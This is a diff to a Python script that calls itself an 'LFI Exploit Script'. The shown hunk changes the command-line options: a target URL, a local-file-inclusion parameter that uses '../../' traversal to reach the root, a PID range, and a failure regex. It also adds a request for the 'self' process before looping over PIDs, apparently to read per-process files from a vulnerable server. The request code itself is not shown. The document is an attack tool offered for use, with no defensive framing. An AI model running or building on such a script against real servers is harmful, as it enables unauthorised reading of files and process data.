@@ -31,14 +31,15 @@ async def send_request(target, param, pid, filter_regex, method):
 async def main():
     parser = argparse.ArgumentParser(description='LFI Exploit Script')
     parser.add_argument('-t', '--target', required=True, help='Target URL (http://DOMAIN/PAGE)')
-    parser.add_argument('-p', '--param', required=True, help='LFI param with the working LFI path')
-    parser.add_argument('-r', '--pid-range', required=True, help='Range of PIDs (number - number)')
+    parser.add_argument('-p', '--param', required=True, help='LFI param with the working LFI path taking you to the root, i.e. / or ../../ ...')
+    parser.add_argument('-r', '--pid-range', required=True, help='Range of PIDs (0 - 1000)')
     parser.add_argument('-fr', '--filter-regex', required=True, help='Regex to match on failure')
-    parser.add_argument('-X', '--method', default='get', help='HTTP method (get or post)')
+    parser.add_argument('-X', '--method', default='get', help='HTTP method (GET or POST)')
     args = parser.parse_args()
     args.method = args.method.lower();
     start_pid, end_pid = map(int, args.pid_range.split('-'))
     tasks = []
+    tasks.append(send_request(args.target, args.param, "self", args.filter_regex, args.method))
     for pid in range(start_pid, end_pid + 1):
         tasks.append(send_request(args.target, args.param, pid, args.filter_regex, args.method))
     await asyncio.gather(*tasks)
